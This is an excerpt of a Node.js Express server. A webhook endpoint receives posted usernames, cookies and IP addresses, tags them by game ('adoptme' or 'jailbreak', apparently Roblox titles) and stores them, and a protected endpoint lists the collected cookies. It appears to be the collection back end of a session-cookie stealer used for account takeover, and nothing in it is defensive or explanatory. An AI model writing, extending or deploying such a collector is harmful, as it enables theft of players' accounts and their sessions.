...
app.post('/webhook', (req, res) => {
  ...
  req.on('end', async () => {
    let parsed;
    try { parsed = JSON.parse(body); } catch (e) { return res.status(400).send('Invalid JSON'); }
    ...
    for (const line of lines) {
      ...
      if (clean.startsWith('IP:')) entry.ip = clean.split('IP:')[1].trim();
    ...
    if (entry.username && entry.cookie) {
      entry.game = type;
      try { await CookieEntry.create(entry); console.log(`Saved ${type} entry`); } catch (err) { console.error('Save error:', err); }
    }
...
app.get('/api/cookies', authMiddleware, async (req, res) => {
  ...
  res.json({ adoptme: entries.filter(e => e.game === 'adoptme'), jailbreak: entries.filter(e => e.game === 'jailbreak') });
});
